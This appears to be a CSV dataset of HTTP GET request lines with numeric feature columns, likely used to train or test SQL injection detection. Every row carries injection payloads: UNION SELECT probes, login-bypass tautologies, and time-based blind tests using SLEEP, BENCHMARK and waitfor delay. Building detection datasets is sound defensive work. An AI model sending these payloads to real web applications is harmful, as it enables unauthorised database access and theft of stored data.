163,2,200,1536,91,6,19,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6_7&pass= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
82,2,200,3075,24,10,13,1,1,GET ?email= AND 7506=9091 AND ('5913=5913&phone=-1' UNION SELECT 1_2_3--  HTTP/1.1
26,1,200,1428,7,4,8,1,1,GET ?id=' or ''*' HTTP/1.1
26,1,200,3607,7,4,8,1,1,GET ?id=' or ''*' HTTP/1.1
26,1,200,5790,7,4,8,1,1,GET ?id=' or ''*' HTTP/1.1
26,1,200,7538,7,4,8,1,1,GET ?id=' or ''*' HTTP/1.1
26,1,200,2620,7,4,8,1,1,GET ?id=' or ''*' HTTP/1.1
26,1,200,1145,7,4,8,1,1,GET ?id=' or ''*' HTTP/1.1
26,1,200,7891,7,4,8,1,1,GET ?id=' or ''*' HTTP/1.1
26,1,200,7499,7,4,8,1,1,GET ?id=' or ''*' HTTP/1.1
55,2,200,1508,7,19,8,1,1,GET ?email=admin" or "1"="1"--&phone=" or "" " HTTP/1.1
85,2,200,2072,30,6,20,1,1,GET ?id='*'&pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10--  HTTP/1.1
65,1,200,4477,8,33,12,1,1,GET ?username= and (select substring(@@version_1_1))='X' HTTP/1.1
65,1,200,3996,8,33,12,1,1,GET ?username= and (select substring(@@version_1_1))='X' HTTP/1.1
142,2,200,2151,36,9,19,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25#&pass= HAVING 1=0--  HTTP/1.1
181,2,200,7674,77,7,31,1,1,GET ?phone= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88)))&id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15# HTTP/1.1
94,1,200,7607,30,5,15,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15--  HTTP/1.1
94,1,200,2081,30,5,15,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15--  HTTP/1.1
94,1,200,2586,30,5,15,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15--  HTTP/1.1
94,1,200,4396,30,5,15,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15--  HTTP/1.1
94,1,200,7484,30,5,15,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15--  HTTP/1.1
265,2,200,1691,129,7,51,1,1,GET ?name= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6#&tel= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65))) HTTP/1.1
108,1,200,1004,30,4,13,1,1,GET ?mail= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21 HTTP/1.1
108,1,200,1362,30,4,13,1,1,GET ?mail= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21 HTTP/1.1
114,1,200,6721,30,4,15,1,1,GET ?user= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22--  HTTP/1.1
114,1,200,6530,30,4,15,1,1,GET ?user= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22--  HTTP/1.1
114,1,200,1082,30,4,15,1,1,GET ?user= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22--  HTTP/1.1
114,1,200,6782,30,4,15,1,1,GET ?user= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22--  HTTP/1.1
114,1,200,1129,30,4,15,1,1,GET ?user= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22--  HTTP/1.1
114,1,200,1488,30,4,15,1,1,GET ?user= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22--  HTTP/1.1
114,1,200,3999,30,4,15,1,1,GET ?user= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22--  HTTP/1.1
114,1,200,6134,30,4,15,1,1,GET ?user= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22--  HTTP/1.1
114,1,200,4116,30,4,15,1,1,GET ?user= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22--  HTTP/1.1
50,2,200,1578,21,7,6,1,1,GET ?phone= ORDER BY 26# &id= ORDER BY 6  HTTP/1.1
47,1,200,1319,17,8,5,2,1,GET ?password=RANDOMBLOB(1000000000/2) HTTP/1.1
47,1,200,1776,17,8,5,2,1,GET ?password=RANDOMBLOB(1000000000/2) HTTP/1.1
47,1,200,4729,17,8,5,2,1,GET ?password=RANDOMBLOB(1000000000/2) HTTP/1.1
47,1,200,4687,17,8,5,2,1,GET ?password=RANDOMBLOB(1000000000/2) HTTP/1.1
118,2,200,2429,31,16,22,1,1,GET ?email=admin' or '1'='1'--&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13# HTTP/1.1
162,2,200,4471,53,11,28,1,1,GET ?account= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11-- &pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15# HTTP/1.1
56,1,200,6015,7,26,12,1,1,GET ?pass=_(select * from (select(sleep(10)))a) HTTP/1.1
56,1,200,2927,7,26,12,1,1,GET ?pass=_(select * from (select(sleep(10)))a) HTTP/1.1
56,1,200,2816,7,26,12,1,1,GET ?pass=_(select * from (select(sleep(10)))a) HTTP/1.1
56,1,200,2628,7,26,12,1,1,GET ?pass=_(select * from (select(sleep(10)))a) HTTP/1.1
56,1,200,6807,7,26,12,1,1,GET ?pass=_(select * from (select(sleep(10)))a) HTTP/1.1
56,1,200,4641,7,26,12,1,1,GET ?pass=_(select * from (select(sleep(10)))a) HTTP/1.1
56,1,200,2248,7,26,12,1,1,GET ?pass=_(select * from (select(sleep(10)))a) HTTP/1.1
56,1,200,4988,7,26,12,1,1,GET ?pass=_(select * from (select(sleep(10)))a) HTTP/1.1
56,1,200,2542,7,26,12,1,1,GET ?pass=_(select * from (select(sleep(10)))a) HTTP/1.1
56,1,200,4457,7,26,12,1,1,GET ?pass=_(select * from (select(sleep(10)))a) HTTP/1.1
56,1,200,5812,7,26,12,1,1,GET ?pass=_(select * from (select(sleep(10)))a) HTTP/1.1
56,1,200,4407,7,26,12,1,1,GET ?pass=_(select * from (select(sleep(10)))a) HTTP/1.1
38,1,200,5941,7,8,16,1,1,GET ?pass=')) or (('x'))=(('x HTTP/1.1
38,1,200,6187,7,8,16,1,1,GET ?pass=')) or (('x'))=(('x HTTP/1.1
38,1,200,3615,7,8,16,1,1,GET ?pass=')) or (('x'))=(('x HTTP/1.1
38,1,200,4987,7,8,16,1,1,GET ?pass=')) or (('x'))=(('x HTTP/1.1
38,1,200,2510,7,8,16,1,1,GET ?pass=')) or (('x'))=(('x HTTP/1.1
32,1,200,2307,7,13,5,1,1,GET ?username=admin" -- HTTP/1.1
32,1,200,2710,7,13,5,1,1,GET ?username=admin" -- HTTP/1.1
32,1,200,2652,7,13,5,1,1,GET ?username=admin" -- HTTP/1.1
32,1,200,2085,7,13,5,1,1,GET ?username=admin" -- HTTP/1.1
32,1,200,1194,7,13,5,1,1,GET ?username=admin" -- HTTP/1.1
32,1,200,6693,7,13,5,1,1,GET ?username=admin" -- HTTP/1.1
120,2,200,5999,46,4,19,1,1,GET ?id="-"&id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15# HTTP/1.1
168,2,200,6628,54,6,26,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19-- &pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8# HTTP/1.1
161,2,200,4046,89,11,20,1,1,GET ?name= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &phone=" or "1"="1 HTTP/1.1
149,2,200,1838,49,7,18,1,1,GET ?name=AND 1&tel= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23# HTTP/1.1
78,2,200,1438,20,28,12,1,1,GET ?account= HAVING 1=0-- &pass=' GROUP BY columnnames having 1=1 -- HTTP/1.1
50,2,200,4295,7,12,17,1,1,GET ?mail=' or '1'='1'--&pass=' or '1′='1 HTTP/1.1
99,2,200,7326,42,8,20,1,1,GET ?id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88)))-- &pass=") or ("1"="1"# HTTP/1.1
38,1,200,1726,14,8,5,1,1,GET ?username= ORDER BY 17--  HTTP/1.1
38,1,200,7153,14,8,5,1,1,GET ?username= ORDER BY 17--  HTTP/1.1
38,1,200,6075,14,8,5,1,1,GET ?username= ORDER BY 17--  HTTP/1.1
38,1,200,1746,14,8,5,1,1,GET ?username= ORDER BY 17--  HTTP/1.1
96,2,200,6241,7,54,13,1,1,GET ?tel=") or "1"="1"--&name=select * from syscat.dbauth where grantee = current user; HTTP/1.1
48,2,200,5786,14,10,8,2,1,GET ?mail= ORDER BY 29 &pass=' or 1=1/* HTTP/1.1
114,1,200,4113,21,4,5,1,1,GET ?code= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28--  HTTP/1.1
114,1,200,2635,21,4,5,1,1,GET ?code= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28--  HTTP/1.1
114,1,200,1789,21,4,5,1,1,GET ?code= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28--  HTTP/1.1
114,1,200,4910,21,4,5,1,1,GET ?code= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28--  HTTP/1.1
114,1,200,1050,21,4,5,1,1,GET ?code= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28--  HTTP/1.1
130,2,200,4586,31,19,23,1,1,GET ?phone="));waitfor delay '0:0:5'--&id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15# HTTP/1.1
35,1,200,7292,7,12,7,1,1,GET ?email=admin' or 1=1-- HTTP/1.1
35,1,200,2530,7,12,7,1,1,GET ?email=admin' or 1=1-- HTTP/1.1
35,1,200,3166,7,12,7,1,1,GET ?email=admin' or 1=1-- HTTP/1.1
35,1,200,1697,7,12,7,1,1,GET ?email=admin' or 1=1-- HTTP/1.1
35,1,200,4594,7,12,7,1,1,GET ?email=admin' or 1=1-- HTTP/1.1
35,1,200,5300,7,12,7,1,1,GET ?email=admin' or 1=1-- HTTP/1.1
35,1,200,4998,7,12,7,1,1,GET ?email=admin' or 1=1-- HTTP/1.1
35,1,200,2532,7,12,7,1,1,GET ?email=admin' or 1=1-- HTTP/1.1
35,1,200,3203,7,12,7,1,1,GET ?email=admin' or 1=1-- HTTP/1.1
115,2,200,5126,30,14,19,1,1,GET ?phone=admin" or 1=1#&id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16--  HTTP/1.1
64,2,200,3575,24,9,10,1,1,GET ?phone=" or 0=0 --&id= AS INJECTX WHERE 1=1 AND 1=0 HTTP/1.1
56,2,200,4438,21,8,9,1,1,GET ?id=' or 1=1#&pass= UNION ALL SELECT 1_2_3# HTTP/1.1
124,2,200,1703,46,19,27,1,1,GET ?name=));waitfor delay '0:0:5'--&tel= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7# HTTP/1.1
115,2,200,5284,21,14,10,1,1,GET ?tel=") or sleep(5)="&name= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22# HTTP/1.1
37,1,200,6508,7,15,7,1,1,GET ?password=' or sleep(5)# HTTP/1.1
37,1,200,5455,7,15,7,1,1,GET ?password=' or sleep(5)# HTTP/1.1
37,1,200,6823,7,15,7,1,1,GET ?password=' or sleep(5)# HTTP/1.1
37,1,200,5413,7,15,7,1,1,GET ?password=' or sleep(5)# HTTP/1.1
37,1,200,2924,7,15,7,1,1,GET ?password=' or sleep(5)# HTTP/1.1
78,1,200,4828,21,4,3,1,1,GET ?user= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17 HTTP/1.1
78,1,200,1846,21,4,3,1,1,GET ?user= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17 HTTP/1.1
78,1,200,3825,21,4,3,1,1,GET ?user= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17 HTTP/1.1
78,1,200,7786,21,4,3,1,1,GET ?user= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17 HTTP/1.1
78,1,200,4939,21,4,3,1,1,GET ?user= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17 HTTP/1.1
192,2,200,5801,57,12,22,1,1,GET ?username= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29#&pass=-1' UNION SELECT 1_2_3--  HTTP/1.1
82,1,200,4762,30,5,13,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12 HTTP/1.1
82,1,200,1379,30,5,13,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12 HTTP/1.1
82,1,200,1065,30,5,13,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12 HTTP/1.1
82,1,200,6182,30,5,13,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12 HTTP/1.1
82,1,200,5448,30,5,13,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12 HTTP/1.1
82,1,200,2561,30,5,13,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12 HTTP/1.1
82,1,200,4663,30,5,13,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12 HTTP/1.1
48,2,200,3758,7,17,13,1,1,GET ?email=admin" --&phone=%' or '0'='0 HTTP/1.1
62,1,200,3727,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,2974,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,6280,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
53,4,200,2815,12,11,15,1,1,GET ?id=admin") or ("1"="1"--&id=&&SLEEP(5)# HTTP/1.1
261,2,200,4039,97,8,42,1,1,GET ?code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25&code= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80)))--  HTTP/1.1
149,1,200,2042,93,5,17,1,1,GET ?phone= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
149,1,200,3648,93,5,17,1,1,GET ?phone= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
149,1,200,6004,93,5,17,1,1,GET ?phone= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
149,1,200,6387,93,5,17,1,1,GET ?phone= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
149,1,200,1344,93,5,17,1,1,GET ?phone= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
149,1,200,2014,93,5,17,1,1,GET ?phone= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
149,1,200,2720,93,5,17,1,1,GET ?phone= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
149,1,200,6452,93,5,17,1,1,GET ?phone= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
130,2,200,3297,31,11,17,1,1,GET ?id=admin' #&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21--  HTTP/1.1
92,2,200,2664,21,6,8,1,1,GET ?id=' #&pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19# HTTP/1.1
113,2,200,1503,35,38,23,1,1,GET ?username=AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)&pass= and (select substring(@@version_3_1))='X' HTTP/1.1
42,1,200,7615,7,17,8,1,1,GET ?username=") or pg_sleep(5)-- HTTP/1.1
42,1,200,4391,7,17,8,1,1,GET ?username=") or pg_sleep(5)-- HTTP/1.1
171,2,200,5493,101,9,20,1,1,GET ?name= or 1=1–&tel= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
119,1,200,6102,21,8,4,1,1,GET ?username= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29# HTTP/1.1
119,1,200,2912,21,8,4,1,1,GET ?username= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29# HTTP/1.1
119,1,200,2340,21,8,4,1,1,GET ?username= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29# HTTP/1.1
119,1,200,6521,21,8,4,1,1,GET ?username= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29# HTTP/1.1
119,1,200,5088,21,8,4,1,1,GET ?username= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29# HTTP/1.1
119,1,200,6144,21,8,4,1,1,GET ?username= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29# HTTP/1.1
49,1,200,5610,13,4,7,1,1,GET ?mail= AND 1083=1083 AND ('1427=1427 HTTP/1.1
49,1,200,7424,13,4,7,1,1,GET ?mail= AND 1083=1083 AND ('1427=1427 HTTP/1.1
49,1,200,3390,13,4,7,1,1,GET ?mail= AND 1083=1083 AND ('1427=1427 HTTP/1.1
49,1,200,3281,13,4,7,1,1,GET ?mail= AND 1083=1083 AND ('1427=1427 HTTP/1.1
49,1,200,5345,13,4,7,1,1,GET ?mail= AND 1083=1083 AND ('1427=1427 HTTP/1.1
96,1,200,4232,46,4,15,1,1,GET ?pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9 HTTP/1.1
96,1,200,1958,46,4,15,1,1,GET ?pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9 HTTP/1.1
96,1,200,6901,46,4,15,1,1,GET ?pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9 HTTP/1.1
96,1,200,1590,46,4,15,1,1,GET ?pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9 HTTP/1.1
96,1,200,1657,46,4,15,1,1,GET ?pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9 HTTP/1.1
96,1,200,1510,46,4,15,1,1,GET ?pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9 HTTP/1.1
52,2,200,5316,7,13,12,2,1,GET ?id=admin") or "1"="1"/*&id=' or 1=1 -- HTTP/1.1
84,1,200,6918,24,18,4,1,1,GET ?phone=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
84,1,200,2041,24,18,4,1,1,GET ?phone=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
84,1,200,2978,24,18,4,1,1,GET ?phone=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
84,1,200,5963,24,18,4,1,1,GET ?phone=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
84,1,200,6296,24,18,4,1,1,GET ?phone=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
329,2,200,7866,145,10,59,1,1,GET ?email= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14&phone= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106) CHAR(107)))# HTTP/1.1
33,1,200,6665,7,11,5,1,1,GET ?mail=admin" or 1=1# HTTP/1.1
33,1,200,5542,7,11,5,1,1,GET ?mail=admin" or 1=1# HTTP/1.1
33,1,200,4624,7,11,5,1,1,GET ?mail=admin" or 1=1# HTTP/1.1
33,1,200,2399,7,11,5,1,1,GET ?mail=admin" or 1=1# HTTP/1.1
33,1,200,5655,7,11,5,1,1,GET ?mail=admin" or 1=1# HTTP/1.1
33,1,200,5061,7,11,5,1,1,GET ?mail=admin" or 1=1# HTTP/1.1
33,1,200,4019,7,11,5,1,1,GET ?mail=admin" or 1=1# HTTP/1.1
33,1,200,5926,7,11,5,1,1,GET ?mail=admin" or 1=1# HTTP/1.1
33,1,200,4312,7,11,5,1,1,GET ?mail=admin" or 1=1# HTTP/1.1
33,1,200,4251,7,11,5,1,1,GET ?mail=admin" or 1=1# HTTP/1.1
66,2,200,4621,18,14,15,1,1,GET ?username=%' AND 8310=8310 AND '%'='&pass=pg_SLEEP(5) HTTP/1.1
29,1,200,4997,7,7,5,1,1,GET ?phone=" or 1=1# HTTP/1.1
29,1,200,1365,7,7,5,1,1,GET ?phone=" or 1=1# HTTP/1.1
29,1,200,4334,7,7,5,1,1,GET ?phone=" or 1=1# HTTP/1.1
29,1,200,6039,7,7,5,1,1,GET ?phone=" or 1=1# HTTP/1.1
29,1,200,1866,7,7,5,1,1,GET ?phone=" or 1=1# HTTP/1.1
170,2,200,4727,54,12,25,1,1,GET ?username= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19#&pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7# HTTP/1.1
51,1,200,5660,9,15,8,1,1,GET ?mail=1 or benchmark(10000000_MD5(1))# HTTP/1.1
51,1,200,2089,9,15,8,1,1,GET ?mail=1 or benchmark(10000000_MD5(1))# HTTP/1.1
51,1,200,7551,9,15,8,1,1,GET ?mail=1 or benchmark(10000000_MD5(1))# HTTP/1.1
51,1,200,3008,9,15,8,1,1,GET ?mail=1 or benchmark(10000000_MD5(1))# HTTP/1.1
51,1,200,1957,9,15,8,1,1,GET ?mail=1 or benchmark(10000000_MD5(1))# HTTP/1.1
253,2,200,7446,94,7,37,1,1,GET ?name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24&tel= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120)))# HTTP/1.1
